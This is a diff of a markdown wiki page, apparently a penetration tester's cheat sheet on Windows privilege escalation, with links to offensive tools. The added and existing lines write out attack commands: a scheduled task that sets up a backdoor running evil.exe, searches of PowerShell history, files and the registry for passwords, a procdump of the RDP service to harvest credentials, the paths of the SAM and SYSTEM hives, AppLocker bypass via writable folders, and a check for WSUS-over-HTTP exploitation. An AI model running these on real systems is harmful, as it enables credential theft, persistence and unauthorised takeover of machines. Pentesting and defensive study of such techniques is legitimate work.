@@ -2,7 +2,7 @@
 title: Windows Privilege Escalation
 description: 
 published: true
-date: 2021-08-09T14:37:30.092Z
+date: 2021-08-09T15:06:05.696Z
 tags: 
 editor: markdown
 dateCreated: 2021-08-09T14:37:30.092Z
@@ -12,17 +12,23 @@ dateCreated: 2021-08-09T14:37:30.092Z
 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
 https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
 
-Powershell history: 
+## Check Powershell history
 type C:\Users\ak\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 https://github.com/frizb/Windows-Privilege-Escalation
 
+https://github.com/GhostPack/Seatbelt
+
 Applocker bypass:
 https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
 
+**PrivsecCheck Powershell Script**
 https://github.com/itm4n/PrivescCheck
+
+**JAWS Enum Script**
+https://github.com/411Hall/JAWS
 
 PowerUp neu: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 powershell
@@ -35,6 +41,7 @@ https://steflan-security.com/windows-privilege-escalation-cheat-sheet/
 WSUS
 https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/
 
+
 https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths
 https://book.hacktricks.xyz/windows/active-directory-methodology
 
@@ -45,6 +52,17 @@ https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388
 
 Persistent back door
 schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
+
+## Applocker bypass - Poor man's method
+**Check for write/execute permission**
+C:\Windows\Tasks
+C:\Windows\Temp
+C:\Windows\tracing
+
+**Find write/execute permissions**
+icacls c:\*. /findsid [USERNAME] /t /c /l
+=> Sometimes C:\Windows has to be specified again
+icacls c:\Windows\ /findsid [USERNAME] /t /c /l
 
 ## Check files / folders in case of automated imaging/setup 
 C:\unattend.xml
@@ -142,6 +160,38 @@ driverquery.exe /fo table
 ## LOLBAS / LOLBINS
 https://lolbas-project.github.io/
 
+
+## WSUS Updates via HTTP
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+ IF it is HTTP like to:
+  HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
+
+ AND if HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer is equals to 1 -it is exploitable! Use https://github.com/pimps/wsuxploit
+
+https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
+
+## Dump RDP Credentials from Terminalserver
+https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/
+sc queryex termservice
+procdump64.exe -ma [PID of termservice] -accepteula C:\Users\test
+
+## SAM Files
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+## Search for user/pass in files/registry
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config
+
+Suche nach registry einträgen mit password/passwort
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
 
 ## Network reconaissance
 Ping sweep (slow)
